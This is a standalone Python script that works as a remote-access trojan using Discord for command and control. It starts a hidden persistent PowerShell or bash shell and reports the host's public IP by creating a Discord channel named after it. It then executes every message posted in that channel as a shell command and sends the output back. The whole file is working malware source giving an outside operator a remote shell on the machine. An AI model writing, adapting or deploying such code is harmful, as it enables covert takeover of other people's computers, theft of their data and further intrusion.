import discord
import requests
import subprocess
import sys
import os
import base64

DISCORD_TOKEN = "DISCORD_BOT_TOKEN"

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

# 1. Detect OS and choose the correct shell
if sys.platform.startswith('win'):
    shell_cmd = ["powershell.exe", "-NoLogo", "-NoExit", "-Command", "-"]
    creation_flags = subprocess.CREATE_NO_WINDOW
else:
    shell_cmd = ["/bin/bash"]
    creation_flags = 0

# 2. Start the persistent shell process
ps = subprocess.Popen(
    shell_cmd,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=creation_flags
)

def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    
    # 3. Format command differently based on the shell
    if sys.platform.startswith('win'):
        # PowerShell Syntax
        wrapped = f"""
        try {{
            {cmd}
        }} catch {{
            Write-Output "$($_.Exception.Message)"
        }}
        Write-Output "{marker}"
        """
    else:
        # Bash Syntax
        wrapped = f"{cmd}; echo '{marker}'\n"

    ps.stdin.write(wrapped)
    ps.stdin.flush()

    output = []
    # Read output line by line until we hit the marker
    for line in ps.stdout:
        # Strip newline characters for cleaner checking
        clean_line = line.strip()
        if marker in clean_line:
            break
        output.append(line.rstrip())

    return "\n".join(output)

@client.event
async def on_ready():
    global channel
    guild = client.guilds[0]
    
    # Get public IP
    try:
        ip = requests.get('https://api.ipify.org').text.replace('.', '-')
    except:
        ip = "unknown-ip"

    # Delete existing channel if it exists (Optional: to keep it clean)
    existing = discord.utils.get(guild.text_channels, name=ip)
    if existing:
        await existing.delete()
        
    channel = await guild.create_text_channel(ip)
    print(f"Connected to {ip}")

@client.event
async def on_message(message):
    # Ensure we only reply in the bot-created channel
    if not 'channel' in globals() or message.channel.id != channel.id:
        return

    if message.author.bot:
        return
    
    # Execute the command
    result = execute_cmd(message.content) or f"Executed {message.content} with no output."
    
    while True:
        await message.channel.send(result[:2000])
        if len(result) < 2000:
            break
        result = result[2000:]

client.run(DISCORD_TOKEN)